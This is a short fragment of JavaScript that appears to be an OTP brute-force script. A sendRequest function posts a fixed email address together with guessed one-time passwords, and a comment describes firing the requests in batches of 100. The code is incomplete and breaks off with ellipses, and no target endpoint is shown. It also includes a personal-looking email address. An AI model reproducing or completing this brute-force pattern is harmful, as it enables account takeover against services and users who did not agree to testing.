...
async function sendRequest(otp) {
  let data = JSON.stringify({
    email: "aveshhasanfatta1155+otp@gmail.com",
    otp: otp,
...
//Sending request in the chunk of 100 and then resolve the chunk of 100 first and then move to next 100 chunk of request.
async function main() {
